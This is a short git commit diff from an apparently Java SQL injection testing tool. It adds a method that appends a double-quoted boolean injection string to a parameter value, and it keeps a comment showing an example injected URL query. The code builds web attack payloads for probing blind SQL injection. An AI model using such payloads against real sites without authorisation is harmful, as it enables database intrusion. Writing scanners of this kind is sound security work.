9a60463ef5f9376d659eaaabf27c082465e80fad
Nataliya.Shevchenko <Nataliya.Shevchenko@gmail.com>
2012-05-22 09:20:28 +0000

    DoubleQuotedStringTest

--- src/main/java/de/nshevchenko/sqlinjection/type/DoubleQuotedString.java
+++ src/main/java/de/nshevchenko/sqlinjection/type/DoubleQuotedString.java
@@ -1,5 +1,7 @@
 package de.nshevchenko.sqlinjection.type;
 
+import org.apache.commons.lang.RandomStringUtils;
+
 /**
  * Created by IntelliJ IDEA.
  * User: nshevchenko
@@ -7,6 +9,15 @@ package de.nshevchenko.sqlinjection.type;
  * Time: 12:33
  * To change this template use File | Settings | File Templates.
  */
-public class DoubleQuotedString {
+public class DoubleQuotedString implements SQLInjection{
     //action=artikel" AND "IXSZX"="IXSZX&cat=8&id=17&artlang=de
+
+    public String createInjection(String oldValue){
+        StringBuffer myNewValue = new StringBuffer(oldValue);
+        myNewValue.append("\" AND \"");
+        myNewValue.append(RandomStringUtils.randomAlphabetic(4));
+        myNewValue.append("\"=\"");
+        myNewValue.append(RandomStringUtils.randomAlphabetic(4));
+        return myNewValue.toString();
+    }
 }
